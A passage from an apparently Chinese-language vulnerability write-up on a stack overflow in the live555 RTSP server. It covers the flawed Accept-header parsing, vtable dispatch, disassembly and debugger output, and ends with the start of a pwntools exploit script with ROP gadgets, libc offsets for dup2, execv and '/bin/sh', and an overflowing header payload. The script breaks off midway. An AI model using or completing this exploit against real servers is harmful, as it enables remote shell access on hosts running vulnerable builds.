.text:0000000000407F8A                 mov     <span class="o">[</span>rsp+6D8h+newBytesRead], rax
.text:0000000000407F8F                 lea     rax, <span class="o">[</span>ptr+rax-1]
.text:0000000000407F94                 cmovnb  r11, rbp
</code></pre></div></div>

<p>acceptStr以参数透传的方式传递给漏洞lookForHeader：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Boolean</span> <span class="n">RTSPServer</span><span class="o">::</span><span class="n">RTSPClientConnection</span><span class="o">::</span><span class="n">parseHTTPRequestString</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">resultCmdName</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">resultCmdNameMaxSize</span><span class="p">,</span>
								 <span class="kt">char</span><span class="o">*</span> <span class="n">urlSuffix</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">urlSuffixMaxSize</span><span class="p">,</span>
								 <span class="kt">char</span><span class="o">*</span> <span class="n">sessionCookie</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">sessionCookieMaxSize</span><span class="p">,</span>
								 <span class="kt">char</span><span class="o">*</span> <span class="n">acceptStr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">acceptStrMaxSize</span><span class="p">)</span> <span class="p">{</span>
								 
  <span class="p">......</span>
  <span class="n">lookForHeader</span><span class="p">(</span><span class="s">"x-sessioncookie"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">reqStr</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">reqStrSize</span><span class="o">-</span><span class="n">i</span><span class="p">,</span> <span class="n">sessionCookie</span><span class="p">,</span> <span class="n">sessionCookieMaxSize</span><span class="p">);</span>
  <span class="n">lookForHeader</span><span class="p">(</span><span class="s">"Accept"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">reqStr</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">reqStrSize</span><span class="o">-</span><span class="n">i</span><span class="p">,</span> <span class="n">acceptStr</span><span class="p">,</span> <span class="n">acceptStrMaxSize</span><span class="p">);</span>
  
  <span class="k">return</span> <span class="n">True</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>漏洞的原因在于攻击者可以在一次http请求中构造多个accept字段，这多个accept字段都会被拷贝到acceptStr[200]数组中，而lookForHeader函数仅对单次拷贝Accept的长度做了限制不超过200：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">lookForHeader</span><span class="p">(</span><span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">headerName</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">source</span><span class="p">,</span> 
						<span class="kt">unsigned</span> <span class="n">sourceLen</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">resultStr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">resultMaxSize</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">resultStr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="n">headerNameLen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">headerName</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">sourceLen</span><span class="o">-</span><span class="n">headerNameLen</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
	  <span class="c1">//循环解析"Accept:"字符串，可以解析多个Accept字段</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">headerName</span><span class="p">,</span> <span class="n">headerNameLen</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">headerNameLen</span><span class="p">]</span> <span class="o">==</span> <span class="sc">':'</span><span class="p">)</span> 
    <span class="p">{</span>
      <span class="c1">//找到了accept头.  跳过空白和制表符</span>
	    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">+=</span> <span class="n">headerNameLen</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">sourceLen</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">' '</span> <span class="o">||</span> <span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\t'</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{}</span>
      <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">j</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">sourceLen</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span> <span class="p">{</span>
				<span class="k">if</span> <span class="p">(</span><span class="n">source</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\r'</span> <span class="o">||</span> <span class="n">source</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\n'</span><span class="p">)</span> <span class="p">{</span>
			  <span class="c1">// 字符串拷贝</span>
				  <span class="k">if</span> <span class="p">(</span><span class="n">j</span><span class="o">-</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span> <span class="o">&gt;</span> <span class="n">resultMaxSize</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>  <span class="c1">//resultMaxSize限制为200, 但这个仅仅是针对单次</span>
																						 <span class="c1">//的复制过程，如果控制每个Accept字段长度不超过200</span>
																						 <span class="c1">//那么就可以反复拷贝造成溢出</span>
				  <span class="c1">// 标记源字符串中的拷贝起始位置</span>
				  <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">resultSource</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
				  <span class="c1">// 标记源字符串中的拷贝结束位置</span>
				  <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">resultSourceEnd</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">source</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
				  <span class="c1">// 位于下标 i,j之间的内容拷贝到acceptStr数组中</span>
				  <span class="k">while</span> <span class="p">(</span><span class="n">resultSource</span> <span class="o">&lt;</span> <span class="n">resultSourceEnd</span><span class="p">)</span> <span class="o">*</span><span class="n">resultStr</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">resultSource</span><span class="o">++</span><span class="p">;</span> <span class="c1">//漏洞点</span>
				  <span class="o">*</span><span class="n">resultStr</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
				  <span class="k">break</span><span class="p">;</span>
				<span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>漏洞的效果是覆盖handleRequestBytes函数到incomingRequestHandle的返回地址。</p>

<h2 id="c虚表函数调用">C++虚表函数调用</h2>

<p>以doEventLoop函数的调用为例，该函数是TaskScheduler对象的方法，而 UsageEnvironment对象又包含了一个TaskScheduler对象：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
  
  <span class="n">TaskScheduler</span><span class="o">*</span> <span class="n">scheduler</span> <span class="o">=</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">createNew</span><span class="p">();</span>
  <span class="n">UsageEnvironment</span><span class="o">*</span> <span class="n">env</span> <span class="o">=</span> <span class="n">BasicUsageEnvironment</span><span class="o">::</span><span class="n">createNew</span><span class="p">(</span><span class="o">*</span><span class="n">scheduler</span><span class="p">);</span>
  <span class="p">......</span>
  <span class="n">env</span><span class="o">-&gt;</span><span class="n">taskScheduler</span><span class="p">().</span><span class="n">doEventLoop</span><span class="p">();</span> <span class="c1">// does not return</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">class</span> <span class="n">TaskScheduler</span> <span class="p">{</span>
	<span class="nl">public:</span>
	  <span class="k">virtual</span> <span class="o">~</span><span class="n">TaskScheduler</span><span class="p">();</span>  <span class="c1">// 析构函数</span>
	  <span class="p">......</span>
	  <span class="k">virtual</span> <span class="kt">void</span> <span class="n">moveSocketHandling</span><span class="p">(</span><span class="kt">int</span> <span class="n">oldSocketNum</span><span class="p">,</span> <span class="kt">int</span> <span class="n">newSocketNum</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	  <span class="k">virtual</span> <span class="kt">void</span> <span class="n">doEventLoop</span><span class="p">(</span><span class="kt">char</span> <span class="k">volatile</span><span class="o">*</span> <span class="n">watchVariable</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="nl">protected:</span>
	  <span class="n">TaskScheduler</span><span class="p">();</span> <span class="c1">// 构造函数</span>
<span class="p">};</span>

<span class="n">class</span> <span class="n">UsageEnvironment</span> <span class="p">{</span>
	<span class="nl">public:</span>
	  <span class="n">Boolean</span> <span class="n">reclaim</span><span class="p">();</span>
	  <span class="n">TaskScheduler</span><span class="o">&amp;</span> <span class="n">taskScheduler</span><span class="p">()</span> <span class="k">const</span> <span class="p">{</span><span class="k">return</span> <span class="n">fScheduler</span><span class="p">;}</span>
	<span class="p">......</span>

	<span class="nl">protected:</span>
	  <span class="n">UsageEnvironment</span><span class="p">(</span><span class="n">TaskScheduler</span><span class="o">&amp;</span> <span class="n">scheduler</span><span class="p">);</span> <span class="c1">// 构造函数</span>
	  <span class="k">virtual</span> <span class="o">~</span><span class="n">UsageEnvironment</span><span class="p">();</span> <span class="c1">// 析构函数</span>

	<span class="nl">private:</span>
	  <span class="n">TaskScheduler</span><span class="o">&amp;</span> <span class="n">fScheduler</span><span class="p">;</span>   <span class="c1">// 包含了一个TaskScheduler对象,保存的是指针</span>
<span class="p">};</span>
     
</code></pre></div></div>

<p>从反汇编的角度来看env-&gt;taskScheduler().doEventLoop()调用过程：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:00000000004052DF loc_4052DF:                             <span class="p">;</span> CODE XREF: main+5D5↓j
.text:00000000004052DF    mov   rax, cs:env    <span class="p">;</span> 解引用env对象
.text:00000000004052E6    xor   esi, esi       <span class="p">;</span> <span class="nb">env</span>+0x18的位置保存TaskScheduler对象指针
.text:00000000004052E8    mov   rdi, <span class="o">[</span>rax+18h] <span class="p">;</span> fScheduler对象地址作为第一个参数, this
.text:00000000004052EC    mov   rax, <span class="o">[</span>rdi]     <span class="p">;</span> 对象的第一个8字节保存的函数虚表地址
.text:00000000004052EF    call  qword ptr <span class="o">[</span>rax+38h] <span class="p">;</span> 虚表中index为7的槽位是doEventLoop函数指针
</code></pre></div></div>

<p>这段代码对应的F5：</p>

<p>可以看到this就是对象本身的指针，this默认作为方法的第一个参数传递给rdi寄存器，方法定义中的其他参数往后顺延。</p>

<p><img src="/assets/posts/2025-04-15-live555栈溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-04-15_171433.png" alt="批注 2025-04-15 171433.png" /></p>

<p>观察数据结构可以看到UsageEnvironment对象和TaskScheduler对象的第0个字节都是虚表指针。</p>

<p>UsageEnvironment对象偏移0x18字节的位置保存了TaskScheduler对象的指针。</p>

<p>每一次对象方法的调用都是以对象的地址作为this指针，传递给rdi寄存器，作为对象方法的第一个参数。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000000 UsageEnvironment struc <span class="p">;</span> <span class="o">(</span><span class="nv">sizeof</span><span class="o">=</span>0x20, <span class="nv">align</span><span class="o">=</span>0x8, copyof_37<span class="o">)</span>
00000000                                         <span class="p">;</span> XREF: BasicUsageEnvironment0/r
00000000 _vptr_UsageEnvironment dq ?             <span class="p">;</span> offset
00000008 liveMediaPriv   dq ?                    <span class="p">;</span> offset
00000010 groupsockPriv   dq ?                    <span class="p">;</span> offset
00000018 fScheduler      dq ?                    <span class="p">;</span> offset
00000020 UsageEnvironment ends
00000020
00000000 <span class="p">;</span> <span class="nt">---------------------------------------------------------------------------</span>
00000000
00000000 TaskScheduler   struc <span class="p">;</span> <span class="o">(</span><span class="nv">sizeof</span><span class="o">=</span>0x8, <span class="nv">align</span><span class="o">=</span>0x8, copyof_44<span class="o">)</span>
00000000 _vptr_TaskScheduler dq ?                <span class="p">;</span> offset
00000008 TaskScheduler   ends
00000008
</code></pre></div></div>

<p>函数虚表是被硬编码在可执行文件中的，其中包含了对象的类型信息和函数指针表。</p>

<p>函数指针表的位置是从0x46AA08开始，该地址保存在对象中，作为方法调用时候的索引基地址，也就是每个对象开头的8个字节：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">A9F8</span> <span class="p">;</span> <span class="err">`</span><span class="n">vtable</span> <span class="k">for</span><span class="err">'</span><span class="n">BasicTaskScheduler</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">A9F8</span> <span class="n">_ZTV18BasicTaskScheduler</span> <span class="n">dq</span> <span class="mi">0</span>           <span class="p">;</span> <span class="n">offset</span> <span class="n">to</span> <span class="n">this</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA00</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZTI18BasicTaskScheduler</span> <span class="p">;</span> <span class="err">`</span><span class="n">typeinfo</span> <span class="k">for</span><span class="err">'</span><span class="n">BasicTaskScheduler</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA08</span> <span class="n">off_46AA08</span>      <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN18BasicTaskSchedulerD2Ev</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA08</span>                                         <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">BasicTaskScheduler</span><span class="o">::~</span><span class="n">BasicTaskScheduler</span><span class="p">()</span><span class="o">+</span><span class="mi">4</span><span class="err">↑</span><span class="n">o</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA08</span>                                         <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::~</span><span class="n">BasicTaskScheduler</span><span class="p">()</span><span class="o">+</span><span class="mi">4</span><span class="err">↑</span><span class="n">o</span> <span class="p">...</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA08</span>                                         <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::~</span><span class="n">BasicTaskScheduler</span><span class="p">()</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA10</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN18BasicTaskSchedulerD0Ev</span> <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::~</span><span class="n">BasicTaskScheduler</span><span class="p">()</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA18</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler019scheduleDelayedTaskElPFvPvES0_</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">scheduleDelayedTask</span><span class="p">(</span><span class="kt">long</span><span class="p">,</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">),</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA20</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler021unscheduleDelayedTaskERPv</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">unscheduleDelayedTask</span><span class="p">(</span><span class="kt">void</span> <span class="o">*&amp;</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA28</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN13TaskScheduler21rescheduleDelayedTaskERPvlPFvS0_ES0_</span> <span class="p">;</span> <span class="n">TaskScheduler</span><span class="o">::</span><span class="n">rescheduleDelayedTask</span><span class="p">(</span><span class="kt">void</span> <span class="o">*&amp;</span><span class="p">,</span><span class="kt">long</span><span class="p">,</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">),</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA30</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN18BasicTaskScheduler21setBackgroundHandlingEiiPFvPviES0_</span> <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">setBackgroundHandling</span><span class="p">(</span><span class="kt">int</span><span class="p">,</span><span class="kt">int</span><span class="p">,</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span><span class="kt">int</span><span class="p">),</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA38</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN18BasicTaskScheduler18moveSocketHandlingEii</span> <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">moveSocketHandling</span><span class="p">(</span><span class="kt">int</span><span class="p">,</span><span class="kt">int</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA40</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler011doEventLoopEPVc</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">doEventLoop</span><span class="p">(</span><span class="kt">char</span> <span class="k">volatile</span><span class="o">*</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA48</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler018createEventTriggerEPFvPvE</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">createEventTrigger</span><span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">))</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA50</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler018deleteEventTriggerEj</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">deleteEventTrigger</span><span class="p">(</span><span class="n">uint</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA58</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler012triggerEventEjPv</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">triggerEvent</span><span class="p">(</span><span class="n">uint</span><span class="p">,</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA60</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN16UsageEnvironment13internalErrorEv</span> <span class="p">;</span> <span class="n">UsageEnvironment</span><span class="o">::</span><span class="n">internalError</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA68</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN18BasicTaskScheduler10SingleStepEj</span> <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">SingleStep</span><span class="p">(</span><span class="n">uint</span><span class="p">)</span>
</code></pre></div></div>

<p>通过调试进一步验证了上述猜想，TaskScheduler对象的地址为0x158fdeb0，该地址位于堆，说明对象是动态分配在堆上面的。</p>

<p>对象的第一个8字节是指向虚表中的函数指针表的指针，值为0x46aa08，与反汇编结果一致。</p>

<p>函数指针表中偏移0x38的位置就是doEventLoop函数的地址，与反汇编结果一致。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──────────────────────────────[ BACKTRACE <span class="o">]</span>────────────────────────────────────
 ► 0         0x441bc0 BasicTaskScheduler0::doEventLoop<span class="o">(</span>char volatile<span class="k">*</span><span class="o">)</span>
   1         0x4052f2 main+1218
   2              0x0 None
───────────────────────────────────────────────────────────────────────────────
<span class="c">#0  BasicTaskScheduler0::doEventLoop (this=0x158fdeb0, watchVariable=0x0) at BasicTaskScheduler0.cpp:76</span>
<span class="c">#1  0x00000000004052f2 in main (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at live555ProxyServer.cpp:263</span>
<span class="c">#2  0x0000000000000000 in ?? ()</span>
pwndbg&gt; x/16xw this                 // 观察TaskScheduler对象, 0x46aa08指向虚表
0x158fdeb0:     0x0046aa08      0x00000000      0x00464ba8      0x00000000
0x158fdec0:     0x15904050      0x00000000      0x15904000      0x00000000
0x158fded0:     0x7fffffca      0x00000000      0x0001789a      0x00000000
0x158fdee0:     0x00000001      0x00000000      0x67fe29e2      0x00000000
pwndbg&gt; x/32xg 0x0046aa08           // 观察虚表, 里面都是函数指针
0x46aa08 &lt;_ZTV18BasicTaskScheduler+16&gt;: 0x000000000043fec0      0x000000000043fee0
0x46aa18 &lt;_ZTV18BasicTaskScheduler+32&gt;: 0x0000000000441dc0      0x0000000000441e60
0x46aa28 &lt;_ZTV18BasicTaskScheduler+48&gt;: 0x0000000000442300      0x000000000043ff10
0x46aa38 &lt;_ZTV18BasicTaskScheduler+64&gt;: 0x0000000000440050      0x0000000000441bc0
0x46aa48 &lt;_ZTV18BasicTaskScheduler+80&gt;: 0x0000000000441c00      0x0000000000441ea0
0x46aa58 &lt;_ZTV18BasicTaskScheduler+96&gt;: 0x0000000000441c70      0x0000000000404e22
0x46aa68 &lt;_ZTV18BasicTaskScheduler+112&gt;:        0x00000000004402d0      0x00007f89e8a85008
</code></pre></div></div>

<h1 id="漏洞利用">漏洞利用</h1>

<p>首先开启服务端程序，live555会在本机8000端口监听：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./live555ProxyServer rtsp://127.0.0.1
LIVE555 Proxy Server
        <span class="o">(</span>LIVE555 Streaming Media library version 2018.08.28<span class="p">;</span> licensed under the GNU LGPL<span class="o">)</span>

Created new TCP socket 4 <span class="k">for </span>connection
RTSP stream, proxying the stream <span class="s2">"rtsp://127.0.0.1"</span>
        Play this stream using the URL: rtsp://192.168.141.128:8554/proxyStream

<span class="o">(</span>We use port 8000 <span class="k">for </span>optional RTSP-over-HTTP tunneling.<span class="o">)</span>
Created new TCP socket 4 <span class="k">for </span>connection
Created new TCP socket 4 <span class="k">for </span>connection
</code></pre></div></div>

<p>漏洞利用代码：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python 
</span>
<span class="c1"># ./exp.py 127.0.0.1 8000
</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="sh">'</span><span class="s">linux</span><span class="sh">'</span>

<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x405301</span>
<span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="mh">0x406277</span>
<span class="n">pop_rdx_rbx_ret</span> <span class="o">=</span> <span class="mh">0x424b50</span>
<span class="n">pop_rcx_ret</span> <span class="o">=</span> <span class="mh">0x415bb5</span>
<span class="n">re_enter</span> <span class="o">=</span> <span class="mh">0x4052DF</span>
<span class="n">send_plt</span> <span class="o">=</span> <span class="mh">0x403560</span>   <span class="c1"># ssize_t send(int sockfd, const void *buf, size_t len, int flags);
</span><span class="n">strncmp_got</span> <span class="o">=</span> <span class="mh">0x46B080</span>
<span class="n">dup2_off</span> <span class="o">=</span> <span class="mh">0x10EAE0</span>
<span class="n">execv_off</span> <span class="o">=</span> <span class="mh">0xE32D0</span>
<span class="n">sh_off</span> <span class="o">=</span> <span class="mh">0x1B45BD</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mh">0x184230</span>

<span class="k">def</span> <span class="nf">genHeader</span><span class="p">(</span><span class="n">raw</span><span class="p">):</span>
    <span class="n">header</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
GET / HTTP/1.1</span><span class="se">\r\n</span><span class="s">
Host: 127.0.0.1:8000</span><span class="se">\r\n</span><span class="s">
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0</span><span class="se">\r\n</span><span class="s">
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><span class="se">\r\n</span><span class="s">
Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">
Connection: keep-alive</span><span class="se">\r\n</span><span class="s">
Upgrade-Insecure-Requests: 1</span><span class="se">\r\n</span><span class="s">
</span><span class="sh">'''</span>
    <span class="n">header</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">Accept:</span><span class="sh">"</span>
    <span class="n">header</span> <span class="o">=</span> <span class="n">header</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
    <span class="n">chunks</span> <span class="o">=</span> <span class="p">[</span><span class="n">raw</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">50</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">raw</span><span class="p">),</span> <span class="mi">50</span><span class="p">)]</span>
    <span class="k">if</span> <span class="n">chunks</span><span class="p">:</span>
        <span class="n">header</span> <span class="o">+=</span> <span class="sh">"</span><span class="se">\r\n</span><span class="s">Accept:</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">().</span><span class="nf">join</span><span class="p">(</span><span class="n">chunks</span><span class="p">)</span>  <span class="c1"># Join chunks with delimiter
</span>    
    <span class="c1"># End the header
